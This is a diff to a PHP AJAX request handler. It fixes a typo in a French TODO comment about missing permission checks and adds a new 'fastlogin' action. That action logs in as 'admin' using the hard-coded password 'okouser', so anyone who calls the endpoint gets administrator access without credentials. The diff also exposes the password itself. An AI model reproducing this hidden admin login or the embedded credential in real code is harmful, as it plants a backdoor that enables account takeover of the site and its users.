@@ -21,7 +21,7 @@ if (is_ajax() && is_valid()) {
     if (isset($_GET['type'], $_GET['action'])) {
         /*
         * TODO
-        * Ajotuer ici un control pour savoir si l'utilisateur en cours a le droit d'appeler les fonctions suivantes
+        * Ajouter ici un control pour savoir si l'utilisateur en cours a le droit d'appeler les fonctions suivantes
         */
         switch ($_GET['type']) {
                 case 'admin':
@@ -150,6 +150,10 @@ if (is_ajax() && is_valid()) {
                         //     break;
                         case 'login':
                             $a->login($_POST['user'], $_POST['pass']);
+
+                            break;
+                        case 'fastlogin':
+                            $a->login("admin", "okouser");
 
                             break;
                         case 'logout':
